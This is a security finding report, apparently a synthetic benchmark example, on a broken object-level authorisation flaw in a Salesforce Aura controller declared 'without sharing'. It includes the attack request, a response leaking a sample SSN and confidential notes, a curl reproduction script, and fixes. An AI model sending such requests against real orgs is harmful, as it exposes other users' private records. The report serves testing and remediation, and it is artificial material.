# Security Analysis Report
**System:** NeoBuild BAS Platform (Salesforce-Integrated)
**Domain:** Smart Home / Building Automation
**Example ID:** SF-0093
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `ContractController.approveContract` — attacker reads any building automation Contract record including all custom fields |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Contract Object (Pattern 1.12)

### Summary
The Apex controller `ContractController` on NeoBuild BAS Platform (`7d510447.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Contract object. Per §5.0 Pattern 1.12, the client-supplied `fields` array allows mass-reading all object attributes without server-side restriction.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getContractDetails(String contractId, ...)` while the Aura descriptor in §6.0 is `c.ContractController.approveContract`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.ContractController.approveContract`
**Affected endpoint:** `POST https://7d510447.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://7d510447.lightning.force.com/aura
Authorization: Bearer 00D7D510447!AR7d510447...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D7D510447!AR7d510447...

message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN",
"params":{"contractId":"0010447","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Contract Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0010447", "Name": "Victim Contract Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-88-9348"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D7D510447!AR7d510447..."
curl -s -X POST "https://7d510447.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN","params":{"contractId":"0010447","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-88-9348
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class ContractController { ... }`
2. `WHERE Id = :contractId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist (prevent mass-read of all custom fields). Validate `aura.token`.
